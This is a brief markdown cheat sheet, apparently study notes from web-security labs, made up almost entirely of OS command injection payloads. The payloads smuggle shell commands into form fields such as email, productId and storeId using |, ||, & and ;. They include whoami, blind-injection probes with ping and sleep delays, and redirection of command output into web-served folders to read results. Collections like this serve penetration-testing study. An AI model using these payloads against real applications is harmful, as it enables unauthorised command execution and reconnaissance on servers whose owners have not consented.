The `&` character is a shell command separator. 

### Encode url all payloads
```bash
productId=1&storeId=2|whoami
# blind os injection, request body
& ping -c 10 127.0.0.1 &
email=x||ping+-c+10+127.0.0.1||
email=x||ping+-c+10+127.0.0.1||
email=x&ping+-c+10+127.0.0.1#
## os injection: & sleep 10 #
email=x@gmail.com+%26+sleep+10+%23+
# blind OS command injection by redirecting output
& whoami > /var/www/static/whoami.txt &
email=& whoami > /var/www/images/whoami.txt #
email=||whoami>/var/www/images/output.txt||
email=;whoami>/var/www/images/output.txt||
```

